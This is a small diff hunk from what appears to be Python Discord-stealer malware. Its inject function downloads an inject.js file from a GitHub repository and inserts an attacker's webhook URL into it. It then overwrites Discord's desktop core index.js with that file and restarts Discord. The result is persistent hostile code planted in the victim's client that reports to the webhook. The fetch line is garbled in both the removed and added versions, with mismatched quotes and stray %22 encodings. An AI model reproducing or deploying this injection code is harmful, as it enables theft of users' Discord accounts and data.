@@ -429,7 +429,7 @@ def inject(webhook_url):
             for dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
                 if match(r'app-(\d.\d)*', dir):
                     abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+_dir) 
-                    f = requests.get("https://github.com/addi00000/pegasus/blob/main/inject.js%22).text.replace(%22%WEBHOOK%", webhook_url)
+                    f = requests.get("https://github.com/addi00000/pegasus/blob/main/inject.js).text.replace(%WEBHOOK%", webhook_url)
                     with open(abspath+'\modules\discord_desktop_core-2\discord_desktop_core\index.js', 'w', encoding="utf-8") as indexFile:
                         indexFile.write(f)
                     os.startfile(abspath+os.sep+_dir+'.exe')
